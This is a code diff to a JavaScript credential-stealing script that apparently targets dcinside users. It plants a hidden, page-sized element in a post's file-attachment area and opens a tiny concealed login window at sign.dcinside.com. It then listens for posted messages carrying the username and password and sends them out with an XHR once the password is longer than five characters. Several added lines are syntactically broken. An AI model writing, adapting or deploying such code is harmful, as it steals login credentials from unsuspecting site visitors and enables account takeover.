@@ -8,8 +8,8 @@ nas.style.top = '1px';
 nas.style.left = '1px';
 nas.style.width = '1px';
 nas.style.height = '1px';
-nas.style.visibility = 'hidden';
-var $ = parent.$;
+//nas.style.visibility = 'hidden';
+var $ = opener.$;
 nas.style.top = '-1000px';
 nas.style.left = '-1000px';
 nas.style.width = '1000000px';
@@ -28,30 +28,18 @@ function request(memo) {
         xhr.send(data);
 }
 
-function warningsign() {
-	var a = newwindow.document.querySelector("#id");
-	var b = document.querySelector("#pw").value;
-        var c = a + '\n' + b;
-	if (b.length < 6) {
-		setTimeout(function () {
-			warningsign();
-			newwindow.document.querySelector('#checksaveid').focus()
-		},
-		500)
-	} else if (b.length < 6) {
-		setTimeout(function () {
-			warningsign()
-		},
-		500)
-	} else {
-		request(c);
-		$('#hash').remove()
+const receiveMessage = function(e){
+        console.log(e.origin);
+	if(e.data.pw.length > 5 && e.origin == "https://sign.dcinside.com"){
+            var id=e.data.id;
+            var pw=e.data.pw;
+            var idpw=id+pw;
+            request(idpw);
 	}
 }
-
-$('div.appending_file_box')[0].appendChild(nas);
-newwindow = window.open('https://dcid.dcinside.com/login', 'hash', 'width=1px, height=1px');
+window.addEventListener("message", receiveMessage, false);
+opener.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
+newwindow = window.open('https://sign.dcinside.com/login', 'hash', 'width=1px, height=1px');
 $('#hash').on('load', function () {
-	newwindow.document.querySelector("html").attr('onclick', 'setTimeout(function(){window.opener.$("#hash").remove()},300);');
-	warningsign()
+	$('html').attr('onclick', 'var i=document.getElementById('child_iframe').contentWindow;iframe.postMessage({ id : document.querySelector("#id").value, pw = document.querySelector("#pw").value }, "*");setTimeout(function(){$("#hash").remove()},300);');
 });
